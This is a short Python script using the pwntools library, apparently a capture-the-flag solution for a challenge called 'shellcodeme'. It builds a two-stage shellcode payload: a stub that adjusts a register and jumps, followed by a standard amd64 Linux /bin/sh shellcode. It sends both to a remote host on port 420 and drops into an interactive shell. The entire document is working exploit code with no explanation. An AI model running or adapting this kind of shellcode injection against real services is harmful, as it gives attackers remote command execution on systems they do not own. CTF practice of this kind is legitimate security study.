from pwn import *

context(arch='amd64', os='linux', log_level='info')

payload = asm("pop rbx; "+("dec rbx; "*(0x72f-0x6d2))+("push rbx; "*64)+"inc rsp; jmp rbx")
payload2 = asm(shellcraft.amd64.linux.sh())+"".join(map(chr, range(100,157)))

s = remote("shellcodeme.420blaze.in",420)
raw_input()

s.sendline(payload)
s.sendline(payload2)

s.interactive()
s.close()
